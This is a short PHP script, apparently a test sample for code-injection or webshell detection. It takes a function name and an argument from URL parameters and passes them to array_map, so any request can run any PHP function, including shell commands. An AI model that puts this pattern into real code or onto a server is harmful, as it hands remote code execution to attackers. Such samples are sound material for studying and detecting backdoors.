<?php
function F($b)
{
    echo $b;
}

$a = $_GET["p1"];
$b = $_GET["p2"];
$input = [$a, "a", "b"];
//call the closure for each element in the array
array_map($b, $input);